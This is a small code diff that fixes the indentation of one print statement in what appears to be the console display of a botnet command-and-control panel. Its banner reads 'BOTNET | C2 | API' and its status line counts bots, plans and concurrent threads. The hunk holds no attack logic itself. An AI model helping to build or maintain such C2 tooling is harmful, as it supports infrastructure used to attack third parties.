@@ -616,7 +616,7 @@ class C2:
         c = T.get('p'); a = T.get('a'); s = T.get('s'); d = T.get('d')
         print(BANNER.format(p=c, a=a, r=R))
         print(f"{c}  BOTNET | C2 | API {R}")
-         print(f"{c}  Made By: Lemonaidd {R}")
+        print(f"{c}  Made By: Lemonaidd {R}")
         status_color = T.get('s') if self.eng.running else T.get('d')
         print(f"{d}  Bots: {len(self.bots)}  |  C2: {T.get('s')}{self.c2_status}{R}{d}  |  Plan: {T.get('a')}{self.plan}{R}{d}  |  Concurrents: {T.get('i')}{self.max_threads}{R}{d}  |  {status_color}{self.short_status()}{R}")
         print(f"{c}  {'='*55}{R}")
